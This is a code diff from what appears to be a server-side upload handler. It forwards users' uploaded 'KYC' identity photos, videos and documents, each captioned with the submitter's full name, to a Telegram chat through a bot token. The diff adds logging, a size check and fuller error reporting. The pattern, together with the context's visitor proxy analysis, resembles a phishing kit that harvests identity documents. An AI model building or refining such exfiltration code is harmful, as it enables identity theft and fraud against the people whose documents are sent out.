@@ -233,6 +233,15 @@ ${securityAnalysis.proxyInfo ? `
             continue;
           }
 
+          // Log file details for debugging
+          console.log(`Processing file: ${file.originalname}, size: ${file.buffer.length} bytes, type: ${file.mimetype}`);
+
+          // Check file size (Telegram limit is 10MB for photos)
+          if (file.buffer.length > 10 * 1024 * 1024) {
+            console.error(`File too large: ${file.originalname} (${file.buffer.length} bytes). Telegram limit is 10MB.`);
+            continue;
+          }
+
           // Determine file type and send accordingly
           const fileExtension = path.extname(file.originalname).toLowerCase();
           const isImage = ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp'].includes(fileExtension);
@@ -242,10 +251,7 @@ ${securityAnalysis.proxyInfo ? `
             // Send as photo using multipart/form-data
             const formData = new FormData();
             formData.append('chat_id', chatId);
-            formData.append('photo', file.buffer, {
-              filename: file.originalname,
-              contentType: file.mimetype || 'image/jpeg'
-            });
+            formData.append('photo', file.buffer, file.originalname);
             formData.append('caption', `📷 ${file.originalname} - ${kycData.fullName}`);
 
             const photoResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
@@ -256,18 +262,19 @@ ${securityAnalysis.proxyInfo ? `
 
             if (!photoResponse.ok) {
               const errorText = await photoResponse.text();
-              console.error('Failed to send photo to Telegram:', errorText);
+              console.error('Failed to send photo to Telegram:');
+              console.error('Status:', photoResponse.status);
+              console.error('Status Text:', photoResponse.statusText);
+              console.error('Error Response:', errorText);
             } else {
-              console.log('Photo sent to Telegram successfully');
+              const responseText = await photoResponse.text();
+              console.log('Photo sent to Telegram successfully:', responseText);
             }
           } else if (isVideo) {
             // Send as video using multipart/form-data
             const formData = new FormData();
             formData.append('chat_id', chatId);
-            formData.append('video', file.buffer, {
-              filename: file.originalname,
-              contentType: file.mimetype || 'video/mp4'
-            });
+            formData.append('video', file.buffer, file.originalname);
             formData.append('caption', `🎥 ${file.originalname} - ${kycData.fullName}`);
 
             const videoResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
@@ -278,18 +285,19 @@ ${securityAnalysis.proxyInfo ? `
 
             if (!videoResponse.ok) {
               const errorText = await videoResponse.text();
-              console.error('Failed to send video to Telegram:', errorText);
+              console.error('Failed to send video to Telegram:');
+              console.error('Status:', videoResponse.status);
+              console.error('Status Text:', videoResponse.statusText);
+              console.error('Error Response:', errorText);
             } else {
-              console.log('Video sent to Telegram successfully');
+              const responseText = await videoResponse.text();
+              console.log('Video sent to Telegram successfully:', responseText);
             }
           } else {
             // Send as document using multipart/form-data
             const formData = new FormData();
             formData.append('chat_id', chatId);
-            formData.append('document', file.buffer, {
-              filename: file.originalname,
-              contentType: file.mimetype
-            });
+            formData.append('document', file.buffer, file.originalname);
             formData.append('caption', `📄 ${file.originalname} - ${kycData.fullName}`);
 
             const docResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
@@ -300,9 +308,13 @@ ${securityAnalysis.proxyInfo ? `
 
             if (!docResponse.ok) {
               const errorText = await docResponse.text();
-              console.error('Failed to send document to Telegram:', errorText);
+              console.error('Failed to send document to Telegram:');
+              console.error('Status:', docResponse.status);
+              console.error('Status Text:', docResponse.statusText);
+              console.error('Error Response:', errorText);
             } else {
-              console.log('Document sent to Telegram successfully');
+              const responseText = await docResponse.text();
+              console.log('Document sent to Telegram successfully:', responseText);
             }
           }
         } catch (fileError) {
